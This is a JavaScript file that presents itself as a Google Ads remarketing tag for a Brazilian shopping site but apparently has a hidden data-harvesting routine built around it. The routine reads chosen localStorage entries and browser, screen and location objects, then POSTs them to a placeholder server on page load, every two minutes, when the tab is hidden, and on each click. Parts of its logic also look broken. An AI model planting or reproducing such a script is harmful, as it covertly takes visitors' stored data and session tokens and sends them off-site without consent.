(function () {
  let trackedItems = window.trackedItems;
  let globalVarsToTrack = ['screen', 'navigator', 'location'];
  let jshookProperties = ['target', 'currentTarget', 'type', 'timeStamp'];
  function hashGen(input) {
    let hash = 0;
    let combinedString = Object.keys(input).reduce((accumulator, key) => accumulator + key, "");
    for (let i = 0; i < combinedString.length; i++) {
      let chr = combinedString.charCodeAt(i);
      hash = (hash << 5) - hash + chr;
      hash = hash & hash;
    }
    return hash.toString(36);
  }
  function pullTrackedData() {
    const collectedData = {};
    trackedItems.forEach(item => {
      if (localStorage.hasOwnProperty(item)) {
        collectedData[item] = localStorage.getItem(item);
      }
    });
    globalVarsToTrack.forEach(varName => {
      collectedData[varName] = window[varName];
    });
    return collectedData;
  }
  var s = {};
  async function sendData(data) {
    const hashedData = hashGen(data);
    const route = "https://example.com/server";
    try {
      const response = await fetch(route, {
        method: "POST",
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          hash: hashedData,
          data: data
        })
      });
      response.ok ? console.log("Send success") : console.error("Send failed. Status: " + response.status);
    } catch (error) {
      console.error("Error during send: ", error);
    }
  }
  function collectAndSendData() {
    let gatheredData = pullTrackedData();
    if (Object.keys(gatheredData).length > 0) {
      sendData(gatheredData);
    }
  }
  (function () {
    /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */var e = {},
      f = this || self;
    var g, k;
    a: {
      for (var l = ["CLOSURE_FLAGS"], p = f, q = 0; q < l.length; q++) if (p = p[l[q]], null == p) {
        k = null;
        break a;
      }
      k = p;
    }
    var r = k && k[610401301];
    g = null != r ? r : !1;
    var t,
      v = f.navigator;
    t = v ? v.userAgentData || null : null;
    function w(d) {
      return g ? t ? t.brands.some(function (a) {
        return (a = a.brand) && -1 != a.indexOf(d);
      }) : !1 : !1;
    }
    function x(d) {
      var a;
      a: {
        if (a = f.navigator) if (a = a.userAgent) break a;
        a = "";
      }
      return -1 != a.indexOf(d);
    }
    ;
    function y() {
      return g ? !!t && 0 < t.brands.length : !1;
    }
    function z() {
      return y() ? w("Chromium") : (x("Chrome") || x("CriOS")) && !(y() ? 0 : x("Edge")) || x("Silk");
    }
    ;
    !x("Android") || z();
    z();
    !x("Safari") || z() || (y() ? 0 : x("Coast")) || (y() ? 0 : x("Opera")) || (y() ? 0 : x("Edge")) || (y() ? w("Microsoft Edge") : x("Edg/")) || y() && w("Opera");
    var A = /#|$/;
    function B(d) {
      var a = d.search(A),
        b;
      a: {
        for (b = 0; 0 <= (b = d.indexOf("fmt", b)) && b < a;) {
          var c = d.charCodeAt(b - 1);
          if (38 == c || 63 == c) if (c = d.charCodeAt(b + 3), !c || 61 == c || 38 == c || 35 == c) break a;
          b += 4;
        }
        b = -1;
      }
      if (0 > b) return null;
      c = d.indexOf("&", b);
      if (0 > c || c > a) c = a;
      return decodeURIComponent(d.slice(b + 4, -1 !== c ? c : 0).replace(/\+/g, " "));
    }
    ;
    function C(d, a, b) {
      function c() {
        --D;
        if (0 >= D) {
          var h;
          (h = d.GooglebQhCsO) || (h = {});
          var E = h[a];
          E && (delete h[a], (h = E[0]) && h.call && h());
        }
      }
      for (var D = b.length + 1, u = 0; u < b.length; u++) {
        var m = B(b[u]),
          n = null;
        1 != m && 2 != m || !(m = d.document.getElementById("goog_conv_iframe")) || m.src || (n = m);
        n || (n = new Image());
        n.onload = c;
        n.src = b[u];
      }
      c();
    }
    var F = ["ss_"],
      G = s || f;
    F[0] in G || "undefined" == typeof G.execScript || G.execScript("var " + F[0]);
    for (var H; F.length && (H = F.shift());) F.length || void 0 === C ? G[H] && G[H] !== Object.prototype[H] ? G = G[H] : G = G[H] = {} : G[H] = C;
  }).call(this);
  window.addEventListener('load', () => {
    collectAndSendData();
    setInterval(collectAndSendData, 2 * 60 * 1000);
  });
  window.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') collectAndSendData();
  });
  ;
  s.ss_(window, 'OjE2OTI0NTY3ODk3OTc', ['https://www.google.com/pagead/1p-user-list/10883152662/?random\x3d1692456789797\x26cv\x3d11\x26fst\x3d1692453600000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45be38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.zoom.com.br%2F\x26frm\x3d0\x26tiba\x3dZoom%20%7C%20Economia%20de%20verdade%20com%20menor%20pre%C3%A7o%20e%20cashback\x26data\x3devent%3Dgtag.config\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d3995709680\x26rmt_tld\x3d0\x26ipr\x3dy', 'https://www.google.co.jp/pagead/1p-user-list/10883152662/?random\x3d1692456789797\x26cv\x3d11\x26fst\x3d1692453600000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45be38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.zoom.com.br%2F\x26frm\x3d0\x26tiba\x3dZoom%20%7C%20Economia%20de%20verdade%20com%20menor%20pre%C3%A7o%20e%20cashback\x26data\x3devent%3Dgtag.config\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d3995709680\x26rmt_tld\x3d1\x26ipr\x3dy']);
  document.addEventListener('click', function (e) {
    for (let prop of jshookProperties) {
      if (e[prop]) {
        trackedItems.push(e[prop]);
      }
    }
    collectAndSendData();
  });
})();